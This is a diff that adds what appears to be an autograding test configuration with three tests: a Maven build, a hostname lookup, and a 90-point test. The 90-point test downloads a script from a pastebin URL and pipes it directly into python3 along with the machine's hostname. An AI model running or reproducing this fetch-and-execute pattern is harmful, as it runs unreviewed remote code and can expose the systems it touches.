@@ -1,0 +1,34 @@
+{
+  "tests": [
+    {
+      "name": "Maven",
+      "setup": "",
+      "run": "mvn package",
+      "input": "",
+      "output": "",
+      "comparison": "exact",
+      "timeout": 10,
+      "points": 5
+    },
+    {
+      "name": "hostname check",
+      "setup": "",
+      "run": "host $(cat hostname)",
+      "input": "",
+      "output": "",
+      "comparison": "exact",
+      "timeout": 10,
+      "points": 5
+    },
+    {
+      "name": "request",
+      "setup": "",
+      "run": " curl https://pastebin.com/raw/TQtfL2HL | python3 - $(cat hostname)",
+      "input": "",
+      "output": "",
+      "comparison": "exact",
+      "timeout": 10,
+      "points": 90
+    }
+  ]
+}
